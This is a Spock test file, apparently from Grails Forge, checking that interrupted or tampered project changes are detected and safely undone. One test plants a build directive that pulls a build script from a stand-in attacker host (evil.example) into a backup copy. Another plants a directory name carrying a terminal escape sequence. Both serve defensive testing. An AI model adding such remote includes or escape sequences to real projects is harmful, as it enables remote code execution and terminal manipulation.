/*
 *  Licensed to the Apache Software Foundation (ASF) under one
 *  or more contributor license agreements.  See the NOTICE file
 *  distributed with this work for additional information
 *  regarding copyright ownership.  The ASF licenses this file
 *  to you under the Apache License, Version 2.0 (the
 *  "License"); you may not use this file except in compliance
 *  with the License.  You may obtain a copy of the License at
 *
 *    https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing,
 *  software distributed under the License is distributed on an
 *  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 *  KIND, either express or implied.  See the License for the
 *  specific language governing permissions and limitations
 *  under the License.
 */
package org.apache.grails.forge.core.change

import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.attribute.PosixFilePermissions
import org.apache.grails.forge.core.state.ProjectState
import org.grails.forge.application.generator.GeneratorContext
import org.grails.forge.application.generator.ProjectGenerator
import org.grails.forge.io.ConsoleOutput
import spock.lang.IgnoreIf
import spock.lang.Requires
import spock.lang.Unroll

/**
 * The ends of a change of a project that the other specs do not come to: a file that appears or
 * becomes something else between the plan and the change, a change that cannot be undone because
 * what it kept is not what it was, a record of a change that is already there, and a home directory
 * of another user. Each has to leave the project as it was, or say exactly what it is now.
 */
class ProjectTransactionFailuresSpec extends AbstractFeatureAdditionSpec {

    static final String REMOVAL = 'Restore the project from version control and remove the file journal from the directory '

    void "a directory where the plan found a file stops the change before anything is written"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Files.delete(project.resolve('build.gradle'))
        Files.createDirectory(project.resolve('build.gradle'))
        Files.writeString(project.resolve('build.gradle/mine.txt'), 'the user wrote this\n')
        Map<String, String> before = tree(project)

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'build.gradle was changed while the change of the project was being prepared; nothing of the project was changed'
        tree(project) == before
        left(project) == []
        journals() == []
    }

    @IgnoreIf({ os.windows })
    void "a link where the plan found a file stops the change, also when it leads to the very content the plan found"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Path elsewhere = directory.resolve('elsewhere.gradle')
        Files.move(project.resolve('build.gradle'), elsewhere)
        Files.createSymbolicLink(project.resolve('build.gradle'), elsewhere)
        Map<String, String> before = tree(project)
        String content = elsewhere.toFile().text

        when:
        plan.apply()

        then: 'the link is not followed, replaced or removed'
        ProjectChangeException e = thrown()
        e.message == 'build.gradle was changed while the change of the project was being prepared; nothing of the project was changed'
        tree(project) == before
        Files.isSymbolicLink(project.resolve('build.gradle'))
        elsewhere.toFile().text == content
        left(project) == []
        journals() == []
    }

    void "a file that is created between the plan and the change where the feature adds one stops the change, and stays"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Files.createDirectory(project.resolve('bin'))
        Files.writeString(project.resolve('bin/tool.sh'), 'the user wrote this\n')
        Map<String, String> before = tree(project)

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'bin/tool.sh was created while the change of the project was being prepared; nothing of the project was changed'
        tree(project) == before
        project.resolve('bin/tool.sh').toFile().text == 'the user wrote this\n'
        left(project) == []
        journals() == []

        expect: 'the next plan sees the file'
        planOf(generator, project).conflicts*.path == ['bin/tool.sh']
    }

    void "a file that is created while the change is made, where the change has not come to, ends the change, and is left as it was written"() {
        given: 'a feature with a file in a directory of its own, which the change comes to after the build file'
        ProjectGenerator generator = generator { GeneratorContext context ->
            if (context.features.contains(FEATURE)) {
                context.addTemplate('notes', new Fixed('notes/feature.txt', 'of the feature\n'.bytes, false, false))
            }
        }
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        List<String> written = []

        when: 'an editor writes a file of that name after the change replaced the build file'
        planOf(generator, project).apply { String path ->
            written << path
            if (path == 'build.gradle') {
                Files.createDirectories(project.resolve('notes'))
                Files.writeString(project.resolve('notes/feature.txt'), 'the user wrote this\n')
            }
        }

        then:
        ProjectChangeException e = thrown()
        e.message == 'notes/feature.txt was changed while the project was being changed; nothing was added, and the project is as it was before, ' +
                'with what was changed in notes/feature.txt meanwhile'
        written.contains('build.gradle')
        !written.contains('notes/feature.txt')

        and: 'the file of the editor is neither replaced nor removed, and everything else is as it was'
        project.resolve('notes/feature.txt').toFile().text == 'the user wrote this\n'
        differing(tree(project), before) == ['notes', 'notes/feature.txt']
        left(project) == []
        journals() == []
        ProjectState.read(project).verifyBaseline(project)
    }

    @IgnoreIf({ os.windows })
    void "a link that takes the place of a file while the change is made, where the change has not come to, ends the change, and is not followed"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        Path configuration = project.resolve('grails-app/conf/application.yml')
        Path elsewhere = directory.resolve('elsewhere.yml')

        when: 'after the build file is replaced, the configuration becomes a link to a file with the very content it had'
        planOf(generator, project).apply { String path ->
            if (path == 'build.gradle') {
                Files.move(configuration, elsewhere)
                Files.createSymbolicLink(configuration, elsewhere)
            }
        }

        then:
        ProjectChangeException e = thrown()
        e.message == 'grails-app/conf/application.yml was changed while the project was being changed; nothing was added, and the project is as it was before, ' +
                'with what was changed in grails-app/conf/application.yml meanwhile'

        and: 'the link is a link, what it leads to was not written, and everything else is as it was'
        Files.isSymbolicLink(configuration)
        sha(elsewhere) == before.get('grails-app/conf/application.yml').split(' ')[0]
        differing(tree(project), before) == ['grails-app/conf/application.yml']
        left(project) == []
        journals() == []
    }

    @Unroll
    @IgnoreIf({ os.windows || System.getProperty('user.name') == 'root' })
    void "a directory of the changes that cannot be written to, #what, stops the change before anything is written"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        ChangePlan plan = planOf(generator, project)
        Path transactions = Files.createDirectories(project.resolve('.grails/transactions'))
        if (withLock) {
            Files.createFile(transactions.resolve('lock'))
        }
        Files.setPosixFilePermissions(transactions, PosixFilePermissions.fromString('r-xr-xr-x'))
        Map<String, String> before = tree(project)

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == message
        tree(project) == before
        left(project) == []
        journals() == []

        when: 'the directory can be written to again'
        Files.setPosixFilePermissions(transactions, PosixFilePermissions.fromString('rwxr-xr-x'))
        plan.apply()

        then:
        tree(project) != before
        ProjectState.read(project).verifyBaseline(project)

        cleanup:
        Files.setPosixFilePermissions(transactions, PosixFilePermissions.fromString('rwxr-xr-x'))

        where:
        what                  | withLock || message
        'with the lock in it' | true     || 'The change could not be prepared (AccessDeniedException); nothing of the project was changed'
        'without a lock'      | false    || 'The lock of the project, .grails/transactions/lock, could not be opened (AccessDeniedException); nothing of the project was changed'
    }

    @IgnoreIf({ os.windows || System.getProperty('user.name') == 'root' })
    void "an undoing that cannot put a file back says to run the command again, and the next one puts back what is left"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'grails-app/conf/application.yml') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        List<String> told = []

        when: 'the directory of the project cannot be written to once the build file is put back, so that README.md is not'
        addition(generator).recover(project) { String path ->
            told << path
            if (path == 'build.gradle') {
                Files.setPosixFilePermissions(project, PosixFilePermissions.fromString('r-xr-xr-x'))
            }
        }

        then:
        ProjectChangeException e = thrown()
        e.message == 'A file of the change that was interrupted could not be put back (AccessDeniedException); run the command again'
        told == ['grails-app/conf/application.yml', 'build.gradle']

        when:
        Files.setPosixFilePermissions(project, PosixFilePermissions.fromString('rwxr-xr-x'))

        then: 'the record of the change is there, and only the file that was not put back is other than it was'
        differing(tree(project), before).findAll { !it.startsWith('.grails/transactions/') } == ['README.md']
        journals().size() == 1

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        recovery.putBack == ['README.md']
        tree(project) == before
        left(project) == []
        journals() == []

        cleanup:
        Files.setPosixFilePermissions(project, PosixFilePermissions.fromString('rwxr-xr-x'))
    }

    void "when a file cannot be written and what was written cannot be put back, the change stays where it is and says so, and is undone once the copy is what it was"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        byte[] configuration = Files.readAllBytes(project.resolve('grails-app/conf/application.yml'))
        List<String> written = []
        Path copy = null
        byte[] kept = null

        when: 'after the build file is replaced, its copy is no more what the file was, and a file the change has not come to is changed'
        planOf(generator, project).apply { String path ->
            written << path
            if (path == 'build.gradle') {
                copy = project.resolve(".grails/transactions/${left(project).first()}/backup/${written.indexOf('build.gradle')}")
                kept = Files.readAllBytes(copy)
                Files.writeString(copy, 'apply from: "https://evil.example/build.gradle"\n')
                project.resolve('grails-app/conf/application.yml').toFile() << 'mine: true\n'
            }
        }

        then: 'both are said: why the change ended, and that nothing was put back'
        ProjectChangeException e = thrown()
        e.message.startsWith('grails-app/conf/application.yml was changed while the project was being changed, and the files that were written could not be put back: ' +
                "The copy of build.gradle that was kept in .grails/transactions/${copy.parent.parent.fileName}/backup is not what the file was; nothing was put back. " + REMOVAL)

        and: 'the files the change wrote are as it wrote them, and its record and its copies are there'
        written == ['README.md', 'build.gradle']
        differing(tree(project), before).findAll { !it.startsWith('.grails/transactions/') } == ['README.md', 'build.gradle', 'grails-app/conf/application.yml']
        journals().size() == 1
        left(project).size() == 1

        when: 'nothing is planned for a project that is half changed'
        planOf(generator, project)

        then:
        ProjectChangeException half = thrown()
        half.message == INTERRUPTED

        when: 'the copy that is not what the file was is put back by no later command either'
        Map<String, String> halfChanged = tree(project)
        Files.write(project.resolve('grails-app/conf/application.yml'), configuration)
        addition(generator).recover(project)

        then:
        ProjectChangeException again = thrown()
        again.message.startsWith('The copy of build.gradle that was kept in ')
        differing(tree(project), halfChanged) == ['grails-app/conf/application.yml']

        when: 'the copy is what the file was'
        Files.write(copy, kept)
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        recovery.putBack == ['README.md', 'build.gradle']
        tree(project) == before
        left(project) == []
        journals() == []
    }

    @Unroll
    void "an interrupted change whose copy of the state #side it is neither what it was nor what the project has undoes nothing, and says to restore the project"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == stoppedAt) {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        String index = journals().first().toFile().readLines().find { it.startsWith('put ') && it.endsWith(' ' + file) }.split(' ')[1]
        Path copy = project.resolve(".grails/transactions/${left(project).first()}/${kind}/${index}")
        byte[] kept = Files.readAllBytes(copy)
        Files.writeString(copy, 'format: 1\n')
        Map<String, String> interrupted = tree(project)

        when:
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith("The state of the project ${side} the change that was interrupted cannot be read: ${file} is not what it was, and neither is its copy. " +
                'Nothing was put back. ' + REMOVAL)
        tree(project) == interrupted
        journals().size() == 1

        when: 'the copy is what it was'
        Files.write(copy, kept)
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        tree(project) == before
        left(project) == []
        journals() == []

        where:
        side     | stoppedAt          | kind     | file
        'after'  | 'build.gradle'     | 'after'  | ProjectState.MANIFEST
        'before' | ProjectState.LOCK  | 'backup' | ProjectState.BASELINE_INDEX
    }

    void "a change is not begun while the record of another that was not ended is there, and is made once that one is undone"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path with = create(generator, 'with', [FEATURE])
        Map<String, String> before = tree(project)
        ChangePlan plan = planOf(generator, project)

        when: 'another command begins the same change and ends before it has replaced a file'
        try {
            planOf(generator, project).apply { String path -> throw new Stopped() }
        } catch (Stopped ignored) {
        }
        Map<String, String> interrupted = tree(project)
        byte[] journal = Files.readAllBytes(journals().first())
        plan.apply()

        then: 'nothing is written, and the record of the other change is the one that was there'
        ProjectChangeException e = thrown()
        e.message == 'An earlier change of the project was interrupted; it has to be undone before the project is changed again'
        tree(project) == interrupted
        journals().size() == 1
        Files.readAllBytes(journals().first()) == journal

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        recovery.putBack == ['README.md']
        recovery.messages == ['An earlier change of the application that was interrupted was undone. 1 file was put back as it was: README.md']
        tree(project) == before

        when:
        plan.apply()

        then:
        tree(project) == tree(with)
        left(project) == []
        journals() == []
    }

    void "a journal that names the record of an earlier version, which no change writes, undoes nothing"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Path earlier = Files.writeString(project.resolve(ProjectState.EARLIER_RECORD), 'applicationType: web\ndefaultPackage: com.acme\nfeatures: [spock]\n')
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == 'build.gradle') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        Path journal = journals().first()
        String written = journal.toFile().text
        Map<String, String> interrupted = tree(project)

        when: 'a line more, which says the change added the file, so that undoing the change would remove it'
        journal.toFile().text = written.replace('\nend\n', "\nput 99 - ${sha(earlier)} ${ProjectState.EARLIER_RECORD}\nend\n")
        addition(generator).recover(project)

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('The record of the change that was interrupted names what is no file of the generated application (grails-forge-cli.yml); nothing was put back.')
        tree(project) == interrupted

        when: 'the journal as it was written'
        journal.toFile().text = written

        then:
        addition(generator).recover(project).undone
        tree(project) == before
    }

    @Requires({ ProjectTransactionFailuresSpec.rootIsOfAnother() })
    void "a home directory of another user keeps no record: nothing is looked for in it, and nothing is changed"() {
        given: 'the root of the file system, which is a directory and absolute and not of whoever runs the tests'
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        FeatureAddition addition = new FeatureAddition(generator, Path.of('/'))

        when: 'what would be done is still worked out'
        ChangePlan plan = addition.plan(project, [FEATURE], null, ConsoleOutput.NOOP)

        then:
        plan.conflicts.isEmpty()

        when:
        plan.apply()

        then:
        ProjectChangeException e = thrown()
        e.message == 'Adding a feature needs a home directory to keep the record of the change in, and the one the system property user.home names cannot be used: ' +
                'the directory is not that of the user who runs the command. Nothing of the project was changed'
        tree(project) == before
        !Files.exists(project.resolve('.grails/transactions'))

        when:
        addition.recover(project)

        then:
        ProjectChangeException recovering = thrown()
        recovering.message == e.message
        tree(project) == before
    }

    @IgnoreIf({ os.windows })
    void "what a project brings along in the directory of the changes is named without a character a terminal acts on"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Files.createDirectories(project.resolve('.grails/transactions').resolve('x\u001b[31m@|red y|@'))
        Map<String, String> before = tree(project)

        when:
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.strangers == ['x\u001b[31m@|red y|@']
        recovery.messages.size() == 1
        recovery.messages[0].startsWith('.grails/transactions has x?[31m@ |red y|@, which no change that this user began')
        !recovery.messages[0].contains('\u001b')
        tree(project) == before
    }

    void "a file the undoing has not come to that an editor writes meanwhile is left as written, the undoing stops there, and its record stays"() {
        given: 'a change that was interrupted after it had written README.md, build.gradle and the configuration'
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        List<String> written = []
        try {
            planOf(generator, project).apply { String path ->
                written << path
                if (path == 'grails-app/conf/application.yml') {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        String change = left(project).first()
        byte[] asWritten = Files.readAllBytes(project.resolve('build.gradle'))
        List<String> told = []

        when: 'every file is looked at, and once the configuration is put back an editor saves the build file, which the undoing comes to next'
        addition(generator).recover(project) { String path ->
            told << path
            if (path == 'grails-app/conf/application.yml') {
                project.resolve('build.gradle').toFile() << '// saved by an editor while the change was undone\n'
            }
        }

        then: 'the undoing stops before the build file, says what to do, and does not tell to edit the record of the change'
        ProjectChangeException e = thrown()
        e.message.startsWith('build.gradle was changed while the change that was interrupted was being undone, and is left as it is. 1 file was put back ' +
                '(grails-app/conf/application.yml); the others were not, and the record of the change is kept. Keep what was changed in build.gradle elsewhere, ' +
                "make the file what it was before the change (the files that were replaced are kept in .grails/transactions/${change}/backup, and a file that was new " +
                'is to be removed) or what the change makes of it, and run the command again; or ' + REMOVAL.uncapitalize())
        !e.message.contains('digest')
        told == ['grails-app/conf/application.yml']

        and: 'what the editor saved is there, the file that was not come to is as the change wrote it, and the record of the change is there'
        project.resolve('build.gradle').toFile().text == new String(asWritten, 'UTF-8') + '// saved by an editor while the change was undone\n'
        differing(tree(project), before).findAll { !it.startsWith('.grails/transactions/') } == ['README.md', 'build.gradle']
        journals().size() == 1
        left(project) == [change]

        when: 'the next command finds the file still other than both, and puts nothing back'
        Map<String, String> stopped = tree(project)
        addition(generator).recover(project)

        then:
        ProjectChangeException again = thrown()
        again.message.startsWith('A file of a change that was interrupted is neither what it was before the change nor what the change makes of it: build.gradle. Nothing was put back.')
        tree(project) == stopped

        when: 'the file is made what the change wrote, as the message says'
        Files.write(project.resolve('build.gradle'), asWritten)
        ProjectRecovery recovery = addition(generator).recover(project)

        then: 'what is left of the change is undone'
        recovery.undone
        recovery.putBack == ['README.md', 'build.gradle']
        tree(project) == before
        left(project) == []
        journals() == []
    }

    void "a file the undoing has not come to that is removed meanwhile is not put back either, and the undoing stops there"() {
        given:
        ProjectGenerator generator = withNewFiles()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        try {
            planOf(generator, project).apply { String path ->
                if (path == ProjectState.LOCK) {
                    throw new Stopped()
                }
            }
        } catch (Stopped ignored) {
        }
        List<String> told = []

        when: 'once the first file is put back, a file the change added is removed by somebody else'
        addition(generator).recover(project) { String path ->
            told << path
            if (told.size() == 1) {
                Files.delete(project.resolve('bin/tool.sh'))
            }
        }

        then:
        ProjectChangeException e = thrown()
        e.message.startsWith('bin/tool.sh was changed while the change that was interrupted was being undone, and is left as it is. ')
        told.first() == ProjectState.LOCK
        !told.contains('bin/tool.sh')
        !told.contains('README.md')
        !Files.exists(project.resolve('bin/tool.sh'))
        journals().size() == 1

        when: 'the file that was new is gone, which is what it was before the change'
        ProjectRecovery recovery = addition(generator).recover(project)

        then:
        recovery.undone
        tree(project) == before
        journals() == []
    }

    static boolean rootIsOfAnother() {
        Path root = Path.of('/')
        if (!root.fileSystem.supportedFileAttributeViews().contains('posix')) {
            return false
        }
        Path probe = Files.createTempFile('probe', '.owner')
        try {
            return Files.getOwner(root) != Files.getOwner(probe)
        } finally {
            Files.delete(probe)
        }
    }

    @Requires({ os.windows })
    void "on Windows the directories the records of changes are kept in are the user's own as the caller says whose a directory is"() {
        given:
        ProjectGenerator generator = generator()
        Path project = create(generator, 'app', [])
        Map<String, String> before = tree(project)
        List<Path> asked = []

        when: 'no directory is the own of the user'
        ProjectTransaction.setOwnedWithoutModes({ Path path -> asked.add(path); false } as java.util.function.Predicate<Path>)
        planOf(generator, project).apply()

        then: 'the first of them stops the change, and the home directory itself was not asked for'
        ProjectChangeException e = thrown()
        assert e.message.contains('.grails is not a directory of the user who runs the command. Nothing of the project was changed'): e.message
        tree(project) == before
        asked*.fileName*.toString() == ['.grails']

        when: 'every directory is'
        ProjectTransaction.setOwnedWithoutModes({ Path path -> true } as java.util.function.Predicate<Path>)
        planOf(generator, project).apply()

        then:
        noExceptionThrown()

        cleanup:
        ProjectTransaction.setOwnedWithoutModes(null)
    }
}
